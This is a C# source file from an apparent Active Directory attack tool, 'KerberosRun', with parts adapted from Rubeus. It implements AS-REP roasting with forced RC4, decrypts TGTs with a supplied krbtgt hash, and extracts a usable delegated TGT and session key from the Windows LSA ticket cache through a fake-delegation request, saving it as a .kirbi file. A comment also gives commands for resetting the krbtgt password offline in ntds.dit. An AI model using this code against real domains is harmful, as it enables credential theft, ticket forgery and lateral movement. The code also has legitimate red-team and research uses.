using System;
using Kerberos.NET.Client;
using Kerberos.NET.Credentials;
using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;
using System.Threading;
using Kerberos.NET.Transport;
using Kerberos.NET;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using NLog;
using System.Runtime.InteropServices;
using System.ComponentModel;
using Kerberos.NET.Win32;

namespace KerberosRun
{
    public class TGT: KerberosService
    {
        private KrbAsReq asReqMessage;
        internal KrbAsRep asRep;
        private KrbEncAsRepPart asDecryptedRepPart;
        internal KrbEncryptionKey sessionKey;
        private KrbApReq krbApReq;
        AuthenticationOptions authOptions = AuthenticationOptions.RenewableOk |
                                            AuthenticationOptions.Canonicalize |
                                            AuthenticationOptions.Renewable |
                                            AuthenticationOptions.Forwardable |
                                            AuthenticationOptions.RepPartCompatible;

        public TGT(): base()
        {
            if (!KerberosRun.NoPAC) { authOptions |= AuthenticationOptions.IncludePacRequest; }
        }


        public override void Create()
        {
            var kdcOptions = (KdcOptions)(authOptions & ~AuthenticationOptions.AllAuthentication);

            var hostAddress = Environment.MachineName;

            var pacRequest = new KrbPaPacRequest
            {
                IncludePac = authOptions.HasFlag(AuthenticationOptions.IncludePacRequest)
            };

            var padata = new List<KrbPaData>()
                    {
                        new KrbPaData
                        {
                            Type = PaDataType.PA_PAC_REQUEST,
                            Value = pacRequest.Encode()
                        }
                    };


            asReqMessage = new KrbAsReq()
            {
                Body = new KrbKdcReqBody
                {
                    Addresses = new[]
                    {
                                new KrbHostAddress
                                {
                                    AddressType = AddressType.NetBios,
                                    Address = Encoding.ASCII.GetBytes(hostAddress.PadRight(16, ' '))
                                }
                            },
                    CName = new KrbPrincipalName()
                    {
                        Type = PrincipalNameType.NT_PRINCIPAL,
                        Name = new[] { KerberosRun.User }// + "@" + domainName.ToUpper() }
                    },
                    //KrbPrincipalName.FromString(
                    //    username,
                    //   PrincipalNameType.NT_ENTERPRISE,
                    //    domainName
                    //),
                    EType = KerberosRun.Asreproast ? new[] { EncryptionType.RC4_HMAC_NT } : KrbConstants.KerberosConstants.ETypes.ToArray(),
                    KdcOptions = kdcOptions,
                    Nonce = KrbConstants.KerberosConstants.GetNonce(),
                    RTime = KrbConstants.KerberosConstants.EndOfTime,
                    Realm = cred.Domain,
                    SName = new KrbPrincipalName
                    {
                        Type = PrincipalNameType.NT_SRV_INST,
                        Name = new[] { "krbtgt", cred.Domain }
                    },
                    Till = KrbConstants.KerberosConstants.EndOfTime,
                    AdditionalTickets = null,
                    EncAuthorizationData = null
                },
                PaData = padata.ToArray()
            };


            if (authOptions.HasFlag(AuthenticationOptions.PreAuthenticate) && !KerberosRun.Asreproast)
            //if (!KerberosRun.Asreproast)
            {
                var ts = new KrbPaEncTsEnc()
                {
                    PaTimestamp = now,
                    PaUSec = now.Millisecond,
                };

                var tsEncoded = ts.Encode();

                var padataAs = asReqMessage.PaData.ToList();

                KrbEncryptedData encData = KrbEncryptedData.Encrypt(
                    tsEncoded,
                    cred.CreateKey(),
                    KeyUsage.PaEncTs
                );

                padataAs.Add(new KrbPaData
                {
                    Type = PaDataType.PA_ENC_TIMESTAMP,
                    Value = encData.Encode()
                });

                asReqMessage.PaData = padataAs.ToArray();
            }
        }



        public override async Task Ask()
        {

            logger.Info("[*] Starting Kerberos Authentication ...");
            //Pre-Auth
            bool notPreauth = true;

            while (notPreauth)
            {
                try
                {
                    logger.Info("[*] Sending AS-REQ to {0}...", KerberosRun.DC);

                    Create();

                    var asReq = asReqMessage.EncodeApplication();
        
                    asRep = await transport.SendMessage<KrbAsRep>(
                        KerberosRun.DC ?? KerberosRun.Domain,
                        asReq,
                        default);
                    logger.Info("[*] Receiving AS-REP...");
                    if (KerberosRun.Asreproast) { return; }
                }
                catch (KerberosProtocolException pex)
                {
                    logger.Info("[x] {0}", pex.Message);

                    if (pex?.Error?.ErrorCode == KerberosErrorCode.KDC_ERR_PREAUTH_REQUIRED)
                    {
                        if (KerberosRun.Asreproast)
                        {
                            logger.Error("[x] Sorry the provided user requires PreAuth.\n");
                            Environment.Exit(1);
                        }

                        //Salt issue for RID 500 Built-in admin account
                        //https://github.com/dotnet/Kerberos.NET/issues/164
                        cred.IncludePreAuthenticationHints(pex?.Error?.DecodePreAuthentication());
                        authOptions |= AuthenticationOptions.PreAuthenticate;
                        logger.Info("[*] Adding encrypted timestamp ...");
                        continue;


                    }
                    else if (pex?.Error?.ErrorCode == KerberosErrorCode.KDC_ERR_PREAUTH_FAILED)
                    {
                        logger.Error("[x] Invalid Credential! Authentication Stopped ...\n");
                        requestFailed = true;
                    }
                    else
                    {
                        logger.Error("[x] Authentication Stopped ...\n");
                        requestFailed = true;
                    }
                    Environment.Exit(0);
                }
                notPreauth = false;
            }


            ticket = asRep.Ticket;
            try
            {
                asDecryptedRepPart = cred.DecryptKdcRep(
                           asRep,
                           KeyUsage.EncAsRepPart,
                           d => KrbEncAsRepPart.DecodeApplication(d));
            }
            catch
            {
                logger.Error("[x] Invalid Credential!\n");
                Environment.Exit(0);
            }
            
            sessionKey = asDecryptedRepPart.Key;
            bKirbi = Kirbi.GetKirbi(asRep, asDecryptedRepPart, KerberosRun.PTT);;
        }



        public override void Display()
        {
            if (!KerberosRun.Verbose) { return; }
            //AS-Req Part
            logger.Info("[*] AS-REQ");
            Displayer.PrintReq(asReqMessage, cred.CreateKey());

            //AS-Rep Part
            logger.Info("[*] AS-REP");
            Displayer.PrintRep(asRep, cred.CreateKey());


            if (authOptions.HasFlag(AuthenticationOptions.PreAuthenticate))
            {
                Console.WriteLine("    * [Decrypted Enc-Part]:");

                Displayer.PrintRepEnc(asDecryptedRepPart, cred.CreateKey());



                //Decrypt TGT
                /*
                net stop ntds
                $key = Get - BootKey - Online
                $cred = ConvertTo - SecureString - String "krbtgt" - AsPlainText - Force
                Set - ADDBAccountPassword - SamAccountName krbtgt - NewPassword $cred - DatabasePath C:\Windows\NTDS\ntds.dit - BootKey $key
                       net start ntds

                KeyTable keytab = new KeyTable(System.IO.File.ReadAllBytes("C:\\Users\\Public\\krbtgt.keytab"));
                var krbtgtkey = keytab.GetKey(EncryptionType.AES256_CTS_HMAC_SHA1_96, asRep.Ticket.SName);
                */

                if (!string.IsNullOrEmpty(KerberosRun.DecryptTGT))
                {
                    var krbtgtCred = new KerberosHashCreds("krbtgt", KerberosRun.DecryptTGT, KerberosRun.DecryptEtype);

                    //TGS - REQ Ticket Enc-Part
                    var ticketDecrypted = asRep.Ticket.EncryptedPart.Decrypt
                        (krbtgtCred.CreateKey(),
                        KeyUsage.Ticket,
                        b => KrbEncTicketPart.DecodeApplication(b));
                    Console.WriteLine("   * [Decrypted TGT]:");
                    Displayer.PrintTicketEnc(ticketDecrypted);
                    //Encrypt the ticket again
                    asRep.Ticket.EncryptedPart = KrbEncryptedData.Encrypt(ticketDecrypted.EncodeApplication(),
                        krbtgtCred.CreateKey(), KeyUsage.Ticket);
                }
            }

        }

        public override void ToFile()
        {
            Utils.WriteBytesToFile(Utils.MakeTicketFileName(KerberosRun.User), bKirbi);
        }




        public void GetDelegateTGT(bool displayTicket = true)
        {
            RequestDelegateTGT();

            GetEncryptionKeyFromCache(ticket.EncryptedPart.EType);

  
            var authenticator = krbApReq.Authenticator.Decrypt(
                                sessionKey.AsKey(),
                                KeyUsage.ApReqAuthenticator,
                                (ReadOnlyMemory<byte> t) => KrbAuthenticator.DecodeApplication(t));

            //https://datatracker.ietf.org/doc/html/rfc4121
            //https://datatracker.ietf.org/doc/html/rfc6542
            //GSS checksum contains KRB_CRED message in the Deleg field
            KrbChecksum checksum  = authenticator.Checksum;

            KerberosRun.User = authenticator.CName.Name[0];

            DelegationInfo delegInfo = checksum.DecodeDelegation();

            ticket = delegInfo.DelegationTicket.Tickets[0];

            var krbCredPart = delegInfo.DelegationTicket.EncryptedPart.Decrypt(
                               sessionKey.AsKey(),
                               KeyUsage.EncKrbCredPart,
                               (ReadOnlyMemory<byte> t) => KrbEncKrbCredPart.DecodeApplication(t));

            sessionKey = krbCredPart.TicketInfo[0].Key;

            

            bKirbi = Kirbi.GetKirbi(ticket, krbCredPart);

            if (displayTicket) {DisplayTicket(); }
            if (KerberosRun.OutFile) { ToFile(); }
        }


        //Token from Rubeus and adapted
        public void RequestDelegateTGT()
        {
            logger.Info("[*] Requesting delegated TGT");
            //Some parts were token from Rubeus
            var phCredential = new Interop.SECURITY_HANDLE();
            var ptsExpiry = new Interop.SECURITY_INTEGER();
            var SECPKG_CRED_OUTBOUND = 2;

            // first get a handle to the Kerberos package
            var status = Interop.AcquireCredentialsHandle(null, "Kerberos", SECPKG_CRED_OUTBOUND, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero, ref phCredential, ref ptsExpiry);

            var ClientToken = new Interop.SecBufferDesc(12288);
            var ClientContext = new Interop.SECURITY_HANDLE(0);
            uint ClientContextAttributes = 0;
            var ClientLifeTime = new Interop.SECURITY_INTEGER(0);
            var SECURITY_NATIVE_DREP = 0x00000010;
            var SEC_E_OK = 0x00000000;
            var SEC_I_CONTINUE_NEEDED = 0x00090312;


            // now initialize the fake delegate ticket for the specified targetname (default cifs/DC.domain.com)
            var status2 = Interop.InitializeSecurityContext(ref phCredential,
                        IntPtr.Zero,
                        KerberosRun.DelegateSPN, // null string pszTargetName,
                        (int)(Interop.ISC_REQ.ALLOCATE_MEMORY | Interop.ISC_REQ.DELEGATE | Interop.ISC_REQ.MUTUAL_AUTH),
                        0, //int Reserved1,
                        SECURITY_NATIVE_DREP, //int TargetDataRep
                        IntPtr.Zero,    //Always zero first time around...
                        0, //int Reserved2,
                        out ClientContext, //pHandle CtxtHandle = SecHandle
                        out ClientToken, //ref SecBufferDesc pOutput, //PSecBufferDesc
                        out ClientContextAttributes, //ref int pfContextAttr,
                        out ClientLifeTime); //ref IntPtr ptsExpiry ); //PTimeStamp

            if ((status2 == SEC_E_OK) || (status2 == SEC_I_CONTINUE_NEEDED))
            {

                if ((ClientContextAttributes & (uint)Interop.ISC_REQ.DELEGATE) == 1)
                {
                    var ClientTokenArray = ClientToken.GetSecBufferByteArray();

                    var gssToken = GssApiToken.Decode(ClientTokenArray);

                    var mechType = gssToken.ThisMech.Value;

                    if (!Utils.KnownMessageTypes.TryGetValue(mechType, out Func<GssApiToken, ContextToken> tokenFunc))
                    {
                        throw new UnknownMechTypeException(mechType);
                    }

                    var ctxToken = tokenFunc(gssToken);

                    var krbCtxToken = ctxToken as KerberosContextToken;

                    ticket = krbCtxToken.KrbApReq.Ticket;

                    krbApReq = krbCtxToken.KrbApReq;

                }
            }
            else
            {
                logger.Error("[x] Unable to obtain a ticket ");
                Environment.Exit(1);
            }
        }




        //Token from Rubeus and adapted
        internal void GetEncryptionKeyFromCache(EncryptionType etype)
        {
            logger.Info("[*] Getting encryption key from cache");
            int authPack;
            IntPtr lsaHandle;
            int retCode;
            var name = "kerberos";
            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            retCode = Interop.LsaConnectUntrusted(out lsaHandle);
            retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

            var returnBufferLength = 0;
            var protocalStatus = 0;
            var responsePointer = IntPtr.Zero;
            var request = new Interop.KERB_RETRIEVE_TKT_REQUEST();
            var response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();

            // signal that we want encoded .kirbi's returned
            request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;
            request.CacheOptions = (uint)Interop.KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_USE_CACHE_ONLY;
            request.EncryptionType = (int)etype;

            // target SPN to fake delegation for
            var tName = new Interop.UNICODE_STRING(KerberosRun.DelegateSPN);
            request.TargetName = tName;

            // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST
            //      for KerbRetrieveEncodedTicketMessages

            // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
            var structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
            var newStructSize = structSize + tName.MaximumLength;
            var unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

            // marshal the struct from a managed object to an unmanaged block of memory.
            Marshal.StructureToPtr(request, unmanagedAddr, false);

            // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
            var newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));

            // copy unicode chars to the new location
            Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);

            // update the target name buffer ptr            
            Marshal.WriteIntPtr(unmanagedAddr, IntPtr.Size == 8 ? 24 : 16, newTargetNameBuffPtr);

            // actually get the data
            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocalStatus);

            // translate the LSA error (if any) to a Windows error
            var winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

            if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0))
            {

                // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                // extract the session key
                var sessionKeyType = (EncryptionType)response.Ticket.SessionKey.KeyType;

                var sessionKeyLength = response.Ticket.SessionKey.Length;

                var sessionKeyBytes = new byte[sessionKeyLength];

                Marshal.Copy(response.Ticket.SessionKey.Value, sessionKeyBytes, 0, sessionKeyLength);

                sessionKey = new KrbEncryptionKey();
                sessionKey.EType = sessionKeyType;
                sessionKey.KeyValue = sessionKeyBytes;

            }
            else
            {
                var errorMessage = new Win32Exception((int)winError).Message;
                logger.Error("[x] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}", winError, KerberosRun.DelegateSPN, errorMessage);
                Environment.Exit(1);
            }

            // clean up
            Interop.LsaFreeReturnBuffer(responsePointer);
            Marshal.FreeHGlobal(unmanagedAddr);

            // disconnect from LSA
            Interop.LsaDeregisterLogonProcess(lsaHandle);
        }

    }
}
